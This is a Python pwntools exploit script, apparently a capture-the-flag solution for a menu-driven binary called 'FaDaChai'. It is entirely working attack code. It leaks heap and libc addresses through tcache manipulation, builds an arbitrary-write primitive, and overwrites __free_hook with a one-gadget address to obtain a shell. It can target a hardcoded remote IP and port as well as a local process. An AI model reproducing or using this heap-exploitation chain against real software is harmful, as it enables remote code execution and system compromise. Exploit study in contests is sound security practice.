from pwn import *
import time
import sys


def mode(is_brief):
    if is_brief:
        proc.recvuntil(':')
        proc.sendline('1')
    else:
        proc.recvuntil(':')
        proc.sendline('2')


def create(buf, brief=True):
    mode(brief)
    proc.recvuntil(':')
    proc.sendline('1')
    proc.recvuntil(':')
    proc.sendline('3')
    proc.recvuntil(':')
    proc.send(buf)


def edit(idx, buf, brief=True):
    mode(brief)
    proc.recvuntil(':')
    proc.sendline('2')
    proc.recvuntil(':')
    proc.sendline(str(idx))
    proc.recvuntil(':')
    proc.send(buf)


def delete(idx, brief=True):
    mode(brief)
    proc.recvuntil(':')
    proc.sendline('3')
    proc.recvuntil(':')
    proc.sendline(str(idx))


def show():
    proc.recvuntil(':')
    proc.sendline('3')

def write(addr, value):
    edit(3, p64(addr))
    edit(0, p64(value))

def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    create(p64(0xdeadbeef)) # 0 2d0
    for i in range(7): # fill tcache
        delete(0)
    show()
    proc.recvuntil(':')
    heapbase = u64(proc.recvuntil(':')[:6] + b'\x00\x00')
    heapbase &= ~0xfff
    print(hex(heapbase))
    if (heapbase >> 40) == 0x55:
        return False
    create(b'\x00') # 1 320
    delete(0)
    edit(0, p64(heapbase + 0x285 - 0x8 + 8))
    create(b'\x00', False) # 0_ 2d0
    create(b'\x00', False) # 1_ 285-8
    edit(1, p64(0x51), False)
    #edit(1, p64((((heapbase + 0x280) << 24) & 0xffffffffffffffff) + 0x51), False)

    delete(0)
    edit(0, p64(heapbase + 0x285 + 8))
    create(b'\x00', False) # 2_
    create(b'\x00', False) # 3_ 285

    delete(1)
    edit(1, p64(heapbase + 0x285 - 0x8 + 8))
    create(b'\x00', False) # 0_ 2d0
    create(b'\x00', False) # 4_ 285-8

    edit(4, p64(((heapbase + 0x280) << 24) & 0xffffffffffffffff), False)
    edit(3, p64(0x56), False)

    write(heapbase + 0x2a0, 0)
    write(heapbase + 0x270, 0x100)
    write(heapbase + 0x2b0, 0) #0_
    write(heapbase + 0x2b8, 0) #1_
    write(heapbase + 0x2c0, 0)
    write(heapbase + 0x2c8, 0)
    write(heapbase + 0x2d0, 0)

    create(b'\x00', False)
    create(b'\x00', False)
    for i in range(8):
        delete(0, False)
    write(heapbase + 0x2b8, 0) #1_
    show()
    proc.recvuntil(':')
    proc.recvuntil(':')
    libc_base = u64(proc.recvuntil('=')[:6] + b'\x00\x00')
    libc_base -= 0x3ebca0
    print(hex(libc_base))
    #malloc_hook = libc_base + 0x3ebc30
    free_hook = libc_base + 0x3ed8e8
    magic = libc_base + 0x4f322
    #write(malloc_hook, magic)
    write(free_hook, magic)
    delete(0, False) # Get shell!!!

    return True


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc 210.65.89.169 8888'
    connect = connect.split(' ')
    while True:
        if len(sys.argv) > 1:
            proc = remote(connect[1], int(connect[2]))
        else:
            proc = process(['./FaDaChai'], env={'LD_LIBRARY_PATH': './'})
            #proc = process(['./FaDaChai'])
        if exploit():
            proc.interactive()
            break
